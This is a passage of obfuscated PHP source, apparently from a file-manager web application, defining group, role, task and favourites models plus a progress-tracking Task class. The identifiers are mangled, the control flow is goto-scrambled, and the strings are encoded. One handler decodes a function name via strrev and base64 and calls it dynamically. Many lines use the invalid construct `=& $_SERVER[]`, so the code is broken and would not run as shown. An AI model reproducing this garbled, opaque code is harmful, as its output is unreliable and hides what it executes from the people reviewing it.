(is_string($E݌)) { $E݌ = array($E݌); } $Fʱ = $E݌; foreach ($E݌ as $D挝) { $Cᩦ = $this->getInfoSimple($D挝); $b헮ұ = array($eȔ[459] => array($eȔ[771], $Cᩦ[$eȔ[459]] . $D挝 . $eȔ[484])); $c䶾 = $this->field($eȔ[2121])->where($b헮ұ)->select(); $Fʱ = array_merge($Fʱ, array_to_keyvalue($c䶾, $eȔ[33], $eȔ[2121])); } return array_unique($Fʱ); } private function _searchFromMeta($A܏Λ, $aʄ, $eڲ, $B) { goto E枑; D望: $Aѡ = array_to_keyvalue($Aѡ, $A⏟[33], $A⏟[2121]); $A = $this->where(array($A⏟[2195] => array($A⏟[7], $Aѡ)))->select(); if (!$A) { return array(); } goto b؎; E枑: $A⏟ =& $_SERVER[]; $aʄ = strtolower($aʄ); $C = array($A⏟[89] => $A܏Λ, $A⏟[359] => array($A⏟[771], "\x25{$aʄ}\x25")); goto fʮ߉; b؎: return $A; goto Cߗڐ; fʮ߉: if ($B) { $C[$A⏟[2121]] = array($A⏟[7], $B); } $Aѡ = Model($A⏟[2204])->where($C)->limit($eڲ)->select(); if (!$Aѡ) { return array(); } goto D望; Cߗڐ: } protected function _listDataApplyItem($a) { $eɻ = array($a); $this->_listDataApply($eɻ); return $eɻ[0]; } protected function _listDataApply(&$F򳯒) { goto c; B: $this->_listAppendChildren($F򳯒); $this->_listAppendChildrenMember($F򳯒); $this->_listAppendMeta($F򳯒, $b⦣); goto f͌; f͌: $this->_listAppendParent($F򳯒); $this->_listAppendSourceRoot($F򳯒, $b⦣); goto a; c: $B㛙 =& $_SERVER[]; if (!$F򳯒) { return; } $b⦣ = array_to_keyvalue($F򳯒, $B㛙[33], $B㛙[2121]); goto B; a: } private function _listAppendChildren(&$d̾Ӻ) { goto E˩۳; D: $bĶ = array_to_keyvalue($bĶ, $cƆ[450]); foreach ($d̾Ӻ as &$d̯ޅ) { $d̯ޅ[$cƆ[2205]] = isset($bĶ[$d̯ޅ[$cƆ[2121]] . $cƆ[2206]]); } goto a̅; E˩۳: $cƆ =& $_SERVER[]; $aƯ = $cƆ[361]; $bĶ = array(); goto d򺅚; d򺅚: $Fվ = count($d̾Ӻ); $d湲 = $this->tablePrefix . $this->tableName; for ($C = 0, $C׼ = 0; $C < $Fվ; $C++) { $C׼++; $C = $d̾Ӻ[$C][$cƆ[2121]]; $aƯ .= "\123\105\x4c\x45\103\x54\40\x2a\x20\x46\x52\117\115\40\50\123\x45\x4c\105\x43\x54\40\47{$C}\x5f\x63\150\x69\x6c\144\x27\40\x61\163\40\150\141\x73\x20\x46\122\x4f\115\x20\140{$d湲}\x60\40\167\x68\145\x72\145\x20\x70\x61\x72\145\156\164\x49\104\x3d{$C}\40\154\151\155\x69\164\40\x31\x29\40\141\x73\x20\164\x62\137{$C}\x20\165\156\x69\x6f\x6e\x20\141\x6c\x6c\40"; if (($C׼ >= 20 || $C == $Fվ - 1) && $aƯ) { $aƯ = substr($aƯ, 0, -strlen($cƆ[449])); $E흈 = $this->query($aƯ); $bĶ = array_merge($bĶ, $E흈); $C׼ = 0; $aƯ = $cƆ[33]; } } goto D; a̅: } private function _listAppendChildrenMember(&$Eþ) { goto A٤펂; Fᕽ: $e = array_to_keyvalue($e, $Dͼ[450]); foreach ($Eþ as &$fю) { $fю[$Dͼ[2207]] = isset($e[$fю[$Dͼ[2121]] . $Dͼ[2206]]); } goto F׮; F: $eѾؠ = count($Eþ); $Aư = $this->tablePrefix . $Dͼ[2197]; for ($ač = 0, $E = 0; $ač < $eѾؠ; $ač++) { $E++; $D = $Eþ[$ač][$Dͼ[2121]]; $bԏ .= "\123\105\x4c\x45\103\x54\40\x2a\40\x46\x52\x4f\x4d\40\50\123\105\114\x45\103\124\x20\47{$D}\x5f\143\x68\x69\x6c\x64\47\x20\x61\163\x20\x68\x61\x73\40\x46\122\x4f\x4d\40\140{$Aư}\140\x20\167\x68\145\x72\x65\x20\147\x72\157\165\160\111\x44\x3d{$D}\x20\x6c\x69\155\151\164\x20\x31\x29\40\141\x73\x20\x74\x62\x5f{$D}\x20\x75\156\x69\x6f\156\x20\x61\154\x6c\40"; if (($E >= 20 || $ač == $eѾؠ - 1) && $bԏ) { $bԏ = substr($bԏ, 0, -strlen($Dͼ[449])); $E = $this->query($bԏ); $e = array_merge($e, $E); $E = 0; $bԏ = $Dͼ[33]; } } goto Fᕽ; A٤펂: $Dͼ =& $_SERVER[]; $bԏ = $Dͼ[361]; $e = array(); goto F; F׮: } private function _listAppendMeta(&$Eȇ, $E) { $Fǧړ =& $_SERVER[]; $D = array($Fǧړ[2121] => array($Fǧړ[7], $E)); $A = Model($Fǧړ[2196])->where($D)->select(); $A = array_to_keyvalue_group($A, $Fǧړ[2121]); foreach ($A as &$BƵ) { $BƵ = array_to_keyvalue($BƵ, $Fǧړ[89], $Fǧړ[359]); } foreach ($Eȇ as &$a͜) { $a͜[$Fǧړ[417]] = array(); if (isset($A[$a͜[$Fǧړ[2121]]])) { $a͜[$Fǧړ[417]] = $A[$a͜[$Fǧړ[2121]]]; } } } protected function parentLevelArray($bخ) { $Aܤ =& $_SERVER[]; $bخ = explode($Aܤ[47], trim($bخ, $Aܤ[47])); $bخ = array_remove_value($bخ, $Aܤ[468]); return $bخ; } private function _listAppendParent(&$fվ) { goto cµޅ; F: $d = $GLOBALS[$B[6]][$B[84]][$B[2209]]; foreach ($fվ as &$BڌԒ) { $Bд = $this->parentLevelArray($BڌԒ[$B[459]]); $f = $B[33]; foreach ($Bд as $a≗ => $D̸) { if ($d && $a≗ == 0) { continue; } $f .= $d歂Ĺ[$D̸] . $B[8]; } if ($Bд) { $f .= $BڌԒ[$B[28]]; } $BڌԒ[$B[463]] = str_replace($B[467], $B[8], $f); } goto a; A: $e = array(); foreach ($d歂Ĺ as $a≗ => $eڽگ) { if (!$eڽگ) { $e[] = $a≗; } } if ($e) { $f = array($B[2195] => array($B[384], $e)); $BՆՊ = $this->field($B[2208])->where($f)->select(); $AŪ㈮ = array_to_keyvalue($BՆՊ, $B[2121], $B[28]); $d歂Ĺ = array_merge_index($d歂Ĺ, $AŪ㈮); } goto F; cµޅ: $B =& $_SERVER[]; $d歂Ĺ = array(); foreach ($fվ as &$BڌԒ) { $d歂Ĺ[$BڌԒ[$B[2121]]] = $BڌԒ[$B[28]]; $Bд = $this->parentLevelArray($BڌԒ[$B[459]]); foreach ($Bд as $D̸) { if (!isset($d歂Ĺ[$D̸])) { $d歂Ĺ[$D̸] = 0; } } } goto A; a: } private function _listAppendSourceRoot(&$c⋔י, $fԯ) { goto bƌ; D鮠ƪ: $F󛶉 = Model($dΟƬ[772])->order($dΟƬ[2211])->field($DŢ)->where($FѤ)->select(); $F󛶉 = array_to_keyvalue($F󛶉, $dΟƬ[456]); $F󛶉 = array_remove_key($F󛶉, $dΟƬ[456]); goto eǯ; bƌ: $dΟƬ =& $_SERVER[]; $FѤ = array($dΟƬ[371] => SourceModel::TYPE_GROUP, $dΟƬ[461] => 0, $dΟƬ[456] => array($dΟƬ[7], $fԯ)); $DŢ = $dΟƬ[2210]; goto D鮠ƪ; eǯ: foreach ($c⋔י as &$eĨ) { $eĨ[$dΟƬ[391]] = $F󛶉[$eĨ[$dΟƬ[2121]]] ? $F󛶉[$eĨ[$dΟƬ[2121]]] : array(); } goto A፾; A፾: } protected function groupMerge($A) { $A = array_unique($A); $bƣ = array(); for ($Dꜧ = 0; $Dꜧ < count($A); $Dꜧ++) { $BШ = !1; for ($e҇ = 0; $e҇ < count($A); $e҇++) { if ($Dꜧ == $e҇) { continue; } if ($this->isParentOf($A[$e҇], $A[$Dꜧ])) { $BШ = !0; break; } } if (!$BШ) { $bƣ[] = $A[$Dꜧ]; } } return $bƣ; } protected function isParentOf($d핰, $D) { goto D; D: $EЖ =& $_SERVER[]; if (!$d핰 || !$D || $d핰 == $D) { return !1; } $C缳 = $this->getInfoSimple($d핰); goto bˆ; d: return !1; goto c䭪觰; bˆ: $C = $this->getInfoSimple($D); $BȰǉ = $C缳[$EЖ[459]] . $d핰 . $EЖ[47]; if (substr($C[$EЖ[459]], 0, strlen($BȰǉ)) == $BȰǉ) { return !0; } goto d; c䭪觰: } public function groupShowRoot($b޲ּ, $a߅ = false) { goto AŠ٘; f䆽Ɇ: if (!$eÆ[$F㼶[417]] || !isset($eÆ[$F㼶[417]][$F㼶[2193]]) || $eÆ[$F㼶[417]][$F㼶[2193]] == $F㼶[2170]) { return $this->groupShowRoot($fܓƜ[count($fܓƜ) - 1], $a߅); } if ($eÆ[$F㼶[417]][$F㼶[2193]] == $F㼶[346]) { $Aң҅ = explode($F㼶[47], $eÆ[$F㼶[417]][$F㼶[2194]]); if ($Aң҅) { $a몍 = array_merge($a몍, $Aң҅); } } return $a몍; goto Eǌ҆; AŠ٘: $F㼶 =& $_SERVER[]; $eÆ = $this->getInfo($b޲ּ); $fܓƜ = $this->parentLevelArray($eÆ[$F㼶[459]]); goto aŔ; aŔ: $a몍 = array($b޲ּ); if (count($fܓƜ) == 0) { return $a몍; } if ($a߅ && count($fܓƜ) == 1) { return $a몍; } goto f䆽Ɇ; Eǌ҆: } protected function resetParentLevel() { $eϽܹՖ =& $_SERVER[]; $E = $eϽܹՖ[2121]; $Eݼ̖ = $this->select(); $Eݼ̖ = array_to_keyvalue($Eݼ̖, $E); foreach ($Eݼ̖ as $d) { goto B; c؛: $this->where(array($E => $d[$E]))->save(array($eϽܹՖ[525] => $DԤˊ)); goto a; B: $Dɏ = $d; $DԤˊ = array(); while ($Dɏ[$eϽܹՖ[461]] != 0) { $DԤˊ[] = $Dɏ[$eϽܹՖ[461]]; $Dɏ = $Eݼ̖[$Dɏ[$eϽܹՖ[461]]]; } goto dܤ; dܤ: $DԤˊ[] = 0; $DԤˊ = $eϽܹՖ[47] . implode($eϽܹՖ[47], array_reverse($DԤˊ)) . $eϽܹՖ[47]; $this->setNamePinyin($d[$E], $d[$eϽܹՖ[28]]); goto c؛; a: } return $Eݼ̖; } public function groupNameAuto($cی, $B) { $eٛ =& $_SERVER[]; $F = $this->where(array($eٛ[368] => $cی))->getField($eٛ[28], !0); if (!$F || !in_array($B, $F)) { return $B; } for ($FҊۆ = 1; $FҊۆ <= count($F) + 1; $FҊۆ++) { $dٽ͔ѓ = $B . "\50{$FҊۆ}\51"; if (!in_array($dٽ͔ѓ, $F)) { return $dٽ͔ѓ; } } } } goto F魆; C͐: function beforeShutdownFatalError($D󿫎հ) { think_exception($D󿫎հ); } $_SERVER[$_SERVER[͒][48]] = $Cմ($_SERVER[$_SERVER[͒][45]]); $Cэט = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto C٣Ӥ; aύ͹: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x72\157\154\145\x4c\151\163\x74"; public $field = array("\156\x61\x6d\145", "\141\x75\x74\150", "\x6c\x61\x62\145\x6c", "\x64\151\x73\160\154\141\171", "\163\171\x73\x74\x65\x6d", "\x64\145\x73\x63", "\x69\x67\x6e\157\x72\x65\105\170\164", "\151\147\x6e\157\x72\x65\x46\151\x6c\145\123\x69\172\x65", "\141\144\x6d\x69\156\151\163\x74\x72\141\x74\x6f\162", "\x73\157\162\x74"); public function listData($e󞰐 = false, $fƾ = "\x73\157\x72\x74", $cи = false) { $c¤ِ =& $_SERVER[]; $cʴʌ = parent::listData($e󞰐, $fƾ, $cи); if (!$e󞰐) { $d = $c¤ِ[2500]; foreach ($cʴʌ as $a => $bлʧ) { if ($bлʧ[$c¤ِ[2501]] == 1) { $cʴʌ[$a][$c¤ِ[405]] = $d; } } } return $cʴʌ; } public function update($fԶ˥, $D㈍) { goto C; d: return parent::update($fԶ˥, $D㈍); goto BӕŇ; C: $FǮ =& $_SERVER[]; $BÃ = parent::listData($fԶ˥); $dۃ = $this->findByName($D㈍[$FǮ[28]]); goto A¹; A¹: if (!$BÃ || $dۃ && $dۃ[$FǮ[367]] != $BÃ[$FǮ[367]]) { return !1; } if ($dۃ[$FǮ[2501]] == 1) { $D㈍ = array($FǮ[28] => $D㈍[$FǮ[28]], $FǮ[2139] => $D㈍[$FǮ[2139]]); } $this->filterAuth($D㈍[$FǮ[376]]); goto d; BӕŇ: } public function remove($eƆ) { $e鄒 = parent::listData($eƆ); if (!$e鄒 || $e鄒[$_SERVER[][1095]]) { return !1; } return parent::remove($eƆ); } public function add($a) { goto C; dୱ: $Eɹ샛 = array($bζ[386] => $B׺¼, $bζ[2127] => $bζ[33], $bζ[2123] => $bζ[2140], $bζ[2502] => 1, $bζ[2126] => 0, $bζ[2503] => 0, $bζ[2125] => $this->getSort()); $a = array_merge($Eɹ샛, $a); $this->filterAuth($a[$bζ[376]]); goto d; d: return parent::insert($a); goto c䅋; C: $bζ =& $_SERVER[]; $B׺¼ = $a[$bζ[28]]; if ($this->findByName($B׺¼)) { return !1; } goto dୱ; c䅋: } private function getSort() { $c =& $_SERVER[]; $Bߠ = parent::listData(); $b = array_to_keyvalue($Bߠ, $c[33], $c[2142]); return empty($b) ? 0 : max($b) + 1; } private function filterAuth(&$aʨ) { $Eޅ =& $_SERVER[]; $Eп = array(); $B籪 = array_filter(explode($Eޅ[47], $aʨ)); foreach ($B籪 as $aʨ) { $AȬ = explode($Eޅ[91], $aʨ); if ($AȬ[0] == $Eޅ[1800] && $AȬ[1] != $Eޅ[1051]) { $D⡎ = $AȬ[0] . $Eޅ[91] . $AȬ[1] . $Eޅ[2504]; if (!in_array($D⡎, $B籪)) { $Eп[] = $D⡎; } } $Eп[] = $aʨ; } $aʨ = implode($Eޅ[47], $Eп); } public function sort($bҌ, $C) { return parent::update($bҌ, $C); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x74\x61\163\x6b\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\164\x79\160\x65", "\145\166\145\156\164", "\164\151\x6d\x65", "\144\x65\163\x63", "\x73\171\163\x74\145\155", "\x65\156\x61\142\x6c\x65", "\x6c\x61\163\x74\122\165\x6e", "\163\x6f\x72\x74"); public function listData($b򥠤Ј = false, $Cȥ = "\x73\x6f\x72\164", $cа䣶 = false) { return parent::listData($b򥠤Ј, $Cȥ, $cа䣶); } public function add($Fӱ) { $d =& $_SERVER[]; $Aα = $this->findByName($Fӱ[$d[28]]); if ($Aα) { return !1; } $Fӱ[$d[1418]] = 0; $Fӱ[$d[2142]] = $this->getSort(); return parent::insert($Fӱ); } private function getSort() { $C⭪ =& $_SERVER[]; $D˹ = parent::listData(); $Eٳ = array_to_keyvalue($D˹, $C⭪[33], $C⭪[2142]); return empty($Eٳ) ? 0 : max($Eٳ) + 1; } public function update($A, $E) { $fͪ =& $_SERVER[]; $b󚃝Њ = $this->listData($A); $eؐߤ = $this->findByName($E[$fͪ[28]]); if (!$b󚃝Њ || $eؐߤ && $eؐߤ[$fͪ[367]] != $b󚃝Њ[$fͪ[367]]) { return !1; } return parent::update($A, $E); } public function remove($F, $C = false) { $Dә =& $_SERVER[]; $BȲ = $this->listData($F); if (!$BȲ) { return; } if (!$C && $BȲ[$Dә[1095]] == $Dә[83]) { return !1; } return parent::remove($F); } public function enable($aҙ, $C) { return $this->update($aҙ, array($_SERVER[][2494] => $C)); } public function run($EҨ) { return $this->update($EҨ, array($_SERVER[][2505] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($D÷) { $Fʌ =& $_SERVER[]; return array($Fʌ[2506] => array(USER_ID, $Fʌ[2507])); } protected function listData() { $CԹ =& $_SERVER[]; $Bꞑ = array($CԹ[1444] => USER_ID, $CԹ[436] => 0); $BЈЎ = $CԹ[2508]; $Dܽ̿ = $this->field($BЈЎ)->where($Bꞑ)->order($CԹ[2509])->select(); return $Dܽ̿ ? $Dܽ̿ : array(); } protected function resetCache() { } protected function listView() { goto a֚; a֚: $D̜ڧ =& $_SERVER[]; $BͿ = $this->listData(); $b߯ = array_filter_by_field($BͿ, $D̜ڧ[29], $D̜ڧ[382]); goto c̃; B׶: $aْë = array_to_keyvalue($aْë, $D̜ڧ[369]); foreach ($BͿ as $dުо => $A葂) { $fì = $aْë[$A葂[$D̜ڧ[75]]]; $fì = $fì ? $fì : array(); $BͿ[$dުо] = array_merge($fì, $A葂); } return $BͿ; goto bǞ; Bϒ: $e߆ = array($D̜ڧ[383] => array($D̜ڧ[384], $DśӉ)); $aْë = Model($D̜ڧ[772])->listSource($e߆, $e؞); $aْë = array_merge($aْë[$D̜ڧ[73]], $aْë[$D̜ڧ[74]]); goto B׶; c̃: $DśӉ = array_to_keyvalue($b߯, $D̜ڧ[33], $D̜ڧ[75]); if (!$DśӉ) { return $BͿ; } $e؞ = 2000; goto Bϒ; bǞ: } protected function addFav($eĸ, $C΅ = '', $b = "\x73\x6f\165\x72\143\x65") { goto Dԧ; cט: $Cޖ螦 = array($f[1444] => USER_ID, $f[436] => 0); $c = $this->where($Cޖ螦)->max($f[2142]); if (!$c) { $c = 0; } goto Cϗ֍; Dԧ: $f =& $_SERVER[]; $Cޖ螦 = array($f[1444] => USER_ID, $f[436] => 0, $f[388] => $b, $f[387] => $eĸ); if ($this->where($Cޖ螦)->find()) { return !1; } goto cט; Cϗ֍: if (!$C΅ && $b == $f[382]) { $Bƫȇ = Model($f[1133])->where(array($f[383] => $eĸ))->find(); if (!$Bƫȇ) { return !1; } $C΅ = $Bƫȇ[$f[28]]; } $C΅ = $this->getAutoName($C΅); $dع = array($f[1444] => USER_ID, $f[436] => 0, $f[386] => $C΅, $f[387] => $eĸ, $f[388] => $b, $f[2125] => $c + 1); goto bυ; bυ: return $this->add($dع); goto DɆ; DɆ: } protected function remove($Aߍ) { $B =& $_SERVER[]; $AÇ͆ = array($B[1444] => USER_ID, $B[385] => $Aߍ); return $this->where($AÇ͆)->delete(); } protected function removeByName($d) { $f➺ =& $_SERVER[]; $E = array($f➺[1444] => USER_ID, $f➺[386] => $d, $f➺[436] => 0); return $this->where($E)->delete(); } protected function rename($EӅ, $AۜĎ) { $BѤ =& $_SERVER[]; if ($EӅ == $AۜĎ) { return !1; } $DĜ = $this->getAutoName($AۜĎ); if ($AۜĎ != $DĜ) { return !1; } $E裰 = array($BѤ[1444] => USER_ID, $BѤ[436] => 0, $BѤ[28] => $EӅ); return $this->where($E裰)->save(array($BѤ[28] => $AۜĎ)); } protected function resetSort($f۩) { $B =& $_SERVER[]; $f۩ = is_array($f۩) ? $f۩ : array(); $f󌗊 = array($B[1444] => USER_ID); for ($DĿ = 0; $DĿ < count($f۩); $DĿ++) { $f󌗊[$B[385]] = $f۩[$DĿ]; $this->where($f󌗊)->save(array($B[2125] => $DĿ + 1)); } return !0; } protected function moveTop($eۿǳ) { goto f栒; f栒: $F =& $_SERVER[]; $f׼ = array($F[1444] => USER_ID, $F[436] => 0); $A = $this->where($f׼)->where(array($F[28] => $eۿǳ))->find(); goto bﴌ; f蠧: return $this->resetSort($A); goto fʌ; fڐ牺: $b = $A; $A = array_remove_value($A, $A[$F[367]]); array_unshift($A, $A[$F[367]]); goto f蠧; bﴌ: if (!$A) { return; } $A = $this->field($F[367])->where($f׼)->order($F[2509])->select(); $A = array_to_keyvalue($A, $F[33], $F[367]); goto fڐ牺; fʌ: } protected function moveBottom($DǍ) { $Fݣ =& $_SERVER[]; $AۙЛ = array($Fݣ[1444] => USER_ID, $Fݣ[436] => 0); $eݙ = $this->where($AۙЛ)->max($Fݣ[2142]); $F˞˒ = array($Fݣ[2142] => $eݙ + 1); return $this->where($AۙЛ)->where(array($Fݣ[28] => $DǍ))->save($F˞˒); } private function getAutoName($F) { goto cɮ̲; E: $eŴ = array_to_keyvalue($eŴ, $f[33], $f[28]); if (!$eŴ || !in_array($F, $eŴ)) { return $F; } for ($EѺ = 0; $EѺ < count($eŴ); $EѺ++) { if (!in_array($F . "\50{$EѺ}\x29", $eŴ)) { return $F . "\x28{$EѺ}\x29"; } } goto Bϴ; cɮ̲: $f =& $_SERVER[]; $d = array($f[1444] => USER_ID, $f[436] => 0); $eŴ = $this->field($f[28])->where($d)->select(); goto E; Bϴ: return $F . "\x28{$EѺ}\51"; goto B̽; B̽: } } goto A; B: function beforeShutdownError($B = false, $C± = '', $AД = '', $e = 0) { $Dś򰃛 =& $_SERVER[͒]; switch ($B) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $dղ = $Dś򰃛[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $dղ = $Dś򰃛[40]; break; case E_STRICT: $dղ = $Dś򰃛[41]; break; case E_NOTICE: case E_USER_NOTICE: $dղ = $Dś򰃛[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $dղ = $Dś򰃛[43]; break; default: break; } if (!$dղ || $dղ == $Dś򰃛[42] || $dղ == $Dś򰃛[43]) { return; } $AД = $Dś򰃛[4] . str_replace($_SERVER[$Dś򰃛[37]], $Dś򰃛[20], $AД); $Cꐲ = $dղ . $Dś򰃛[44] . $C± . $Dś򰃛[44] . $AД . $Dś򰃛[44] . $e; write_log($Cꐲ . $Dś򰃛[18] . get_caller_msg(1), $Dś򰃛[19]); } $_SERVER[$_SERVER[͒][45]] = $_SERVER[$_SERVER[͒][37]] . $_SERVER[͒][46]; $Cմ = strrev(base64_decode($_SERVER[͒][47])); goto C͐; dɦȌ: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($dܥȋ, $bㆇ = '', $eƳֿ = 0, $bΝ = '') { goto Dˇ򱗸; Dˇ򱗸: $E퍹 =& $_SERVER[]; if (self::get($dܥȋ)) { return; } $this->task = array($E퍹[367] => $dܥȋ, $E퍹[1453] => USER_ID, $E퍹[1359] => $bΝ, $E퍹[29] => $bㆇ, $E퍹[993] => $E퍹[33], $E퍹[991] => $eƳֿ, $E퍹[1005] => 0, $E퍹[1454] => 0, $E퍹[1455] => 0, $E퍹[1456] => timeFloat(), $E퍹[1457] => 0, $E퍹[1458] => 0, $E퍹[1459] => 0, $E퍹[1460] => 0, $E퍹[708] => $E퍹[1417]); goto D; E͵ŃȤ: Hook::trigger($E퍹[1464], $this->task); $this->task[$E퍹[1458]] = timeFloat(); goto D߲ȓ; D: Hook::bind($E퍹[1419], array($this, $E퍹[1461])); Hook::bind($E퍹[1462], array($this, $E퍹[1463])); $this->startAfter(); goto E͵ŃȤ; D߲ȓ: } public function end() { goto Dɩׄ; Dɩׄ: $c٥ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$c٥[1458]]) { self::valueSet($this->task[$c٥[367]], !1); } goto Aɨ̊; Aɨ̊: $Də = timeFloat() - $this->task[$c٥[1456]]; self::log($c٥[1465] . $this->task[$c٥[367]] . $c٥[1466] . $Də . $c٥[1467]); Hook::unbind($c٥[1419], array($this, $c٥[1461])); goto a; a: Hook::unbind($c٥[1462], array($this, $c٥[1463])); $this->endAfter(); $this->task = !1; goto B鄃; B鄃: } public function update($F = 0) { goto Dʡ; Ḍ: Hook::trigger($A[1471], $cґ); self::valueSet($cґ[$A[367]], $cґ); goto Fղ̊; F: $e = self::get($cґ[$A[367]]); $Aٚ = $e[$A[708]]; if ($Aٚ == self::STATYS_KILL) { $fϜ = array($A[1468] => LNG($A[1469]), $A[1047] => !1); Cache::set($A[1470] . $this->task[$A[367]], $fϜ, 30); $this->end(); die; } else { if ($Aٚ == self::STATYS_STOP) { $D = 2; $e[$A[1459]] += $D; self::valueSet($cґ[$A[367]], $e); sleep($D); $this->update(); return; } } goto Dߥ距; Dʡ: $A =& $_SERVER[]; $cґ =& $this->task; if (!$cґ) { return; } goto E; Dߥ距: $cґ[$A[708]] = $Aٚ ? $Aٚ : $cґ[$A[708]]; $cґ[$A[1459]] = $e[$A[1459]] ? $e[$A[1459]] : 0; $cґ[$A[1458]] = timeFloat(); goto Ḍ; E: $cґ[$A[1005]] += $F; $cґ[$A[1457]] = timeFloat(); if ($cґ[$A[991]]) { if ($cґ[$A[991]] < $cґ[$A[1005]]) { $cґ[$A[991]] = $cґ[$A[1005]]; } $Cݳ쑵 = timeFloat() - $cґ[$A[1456]] - $cґ[$A[1459]]; $cґ[$A[1454]] = $cґ[$A[1005]] / $cґ[$A[991]]; $cґ[$A[1455]] = $cґ[$A[1005]] / $Cݳ쑵; if ($cґ[$A[1454]] > 0) { $cґ[$A[1460]] = $Cݳ쑵 * (1 - $cґ[$A[1454]]) / $cґ[$A[1454]]; } $cґ[$A[1460]] = $cґ[$A[1460]] <= 0 ? 0 : $cґ[$A[1460]]; } goto a㟰˫; a㟰˫: $this->updateAfter(); $Eޅ = 0.2; if (timeFloat() - $cґ[$A[1458]] < $Eޅ) { return; } goto F; Fղ̊: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($C) { $b܌Ӆت =& $_SERVER[]; Cache::set($b܌Ӆت[1470] . $this->task[$b܌Ӆت[367]], $C, 60); return $C; } public static function get($E) { return self::valueGet($E); } public static function listData() { $fݷиɜ = self::valueGet(); return array_sort_by($fݷиɜ, $_SERVER[][1456], !0); } public static function kill($fʥ׊) { return self::changeStatus($fʥ׊, self::STATYS_KILL); } public static function stop($d) { return self::changeStatus($d, self::STATYS_STOP); } public static function restart($cņ) { return self::changeStatus($cņ, self::STATYS_RUNNING); } public static function killAll() { $b =& $_SERVER[]; $A⌑ = self::listData(); foreach ($A⌑ as $D䜐) { self::kill($D䜐[$b[367]]); } sleep(2); foreach ($A⌑ as $D䜐) { self::valueSet($D䜐[$b[367]], !1); } } private static function changeStatus($eŊ, $e) { goto C; C: $c =& $_SERVER[]; $aꪨ = self::valueGet($eŊ); if (!$aꪨ) { return !1; } goto Eޣ; bػ: return !0; goto B; Eޣ: $aꪨ[$c[708]] = $e; self::valueSet($eŊ, $aꪨ); self::log($c[1472] . $aꪨ[$c[367]] . $c[1473] . $e); goto bػ; B: } public static function valueGet($b = false) { $f앰 =& $_SERVER[]; if ($b) { $E񊆿 = Model($f앰[399])->where(array($f앰[89] => $b, $f앰[29] => $f앰[1474]))->find(); return $E񊆿 ? json_decode($E񊆿[$f앰[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($F渌 = false) { goto f͌; aṱ: return $Dũ; goto Fő; dݵ: $Dũ = Model($Fꟽ[399])->where($E)->select(); $Dũ = $Dũ ? $Dũ : array(); foreach ($Dũ as $bټ => $Eю) { $Dũ[$bټ] = json_decode($Eю[$Fꟽ[359]], !0); } goto aṱ; f͌: $Fꟽ =& $_SERVER[]; $E = array($Fꟽ[29] => $Fꟽ[1474]); if ($F渌) { $E[$Fꟽ[1453]] = $F渌; } goto dݵ; Fő: } public static function valueSet($A, $D᝱) { goto CЊ; E͏: if (!$eܖ܉܇) { ob_start(); var_dump($D᝱); $A = ob_get_clean(); self::log($B۾ک[1475] . json_encode_force($A)); } if (!$A || !$D᝱[$B۾ک[367]]) { return !1; } $DӐ = array($B۾ک[29] => $B۾ک[1474], $B۾ک[1453] => USER_ID, $B۾ک[89] => $A, $B۾ک[359] => $eܖ܉܇); goto Aݿ; Aݿ: Model($B۾ک[399])->add($DӐ, array(), !0); goto AيĜ; CЊ: $B۾ک =& $_SERVER[]; if (!$D᝱) { return Model($B۾ک[399])->where(array($B۾ک[89] => $A, $B۾ک[29] => $B۾ک[1474]))->delete(); } $eܖ܉܇ = json_encode($D᝱); goto E͏; AيĜ: } public static function log($d鳹) { write_log($d鳹, $_SERVER[][1476]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e; bգ: Hook::bind($Dҫ[543], array($this, $Dҫ[1485])); Hook::bind($Dҫ[509], array($this, $Dҫ[1486])); Hook::bind($Dҫ[506], array($this, $Dҫ[1486])); goto fп; eȉ: $AҸ[$Dҫ[1496]] = LNG($Dҫ[1497]); $AҸ[$Dҫ[1498]] = 0; $AҸ[$Dҫ[1499]] = 0; goto D۔; e: $Dҫ =& $_SERVER[]; $AҸ =& $this->task; $this->sourceCopyFolder = !1; goto A; fп: Hook::bind($Dҫ[511], array($this, $Dҫ[1486])); Hook::bind($Dҫ[513], array($this, $Dҫ[1486])); Hook::bind($Dҫ[515], array($this, $Dҫ[1486])); goto bڒ̜ٛ; bڒ̜ٛ: Hook::bind($Dҫ[1487], array($this, $Dҫ[1488])); Hook::bind($Dҫ[532], array($this, $Dҫ[1489])); $this->sourceModelCopyFlag = !1; goto E夦; f贪: Hook::bind($Dҫ[539], array($this, $Dҫ[1483])); Hook::bind($Dҫ[540], array($this, $Dҫ[1484])); Hook::bind($Dҫ[542], array($this, $Dҫ[1485])); goto bգ; cڞܑ: $AҸ[$Dҫ[1502]] = 0; $AҸ[$Dҫ[1503]] = 0; if (!$AҸ[$Dҫ[1359]]) { $AҸ[$Dҫ[1359]] = LNG($Dҫ[1504]); } goto cѫߩ; A: Hook::bind($Dҫ[1477], array($this, $Dҫ[1478])); Hook::bind($Dҫ[1479], array($this, $Dҫ[1480])); Hook::bind($Dҫ[1481], array($this, $Dҫ[1482])); goto f贪; E夦: Hook::bind($Dҫ[1490], array($this, $Dҫ[1491])); Hook::bind($Dҫ[1492], array($this, $Dҫ[1493])); Hook::bind($Dҫ[1494], array($this, $Dҫ[1495])); goto eȉ; D۔: $AҸ[$Dҫ[993]] = $Dҫ[33]; $AҸ[$Dҫ[1500]] = $Dҫ[33]; $AҸ[$Dҫ[1501]] = 0; goto cڞܑ; cѫߩ: } protected function endAfter() { goto Eτ; cȅ: 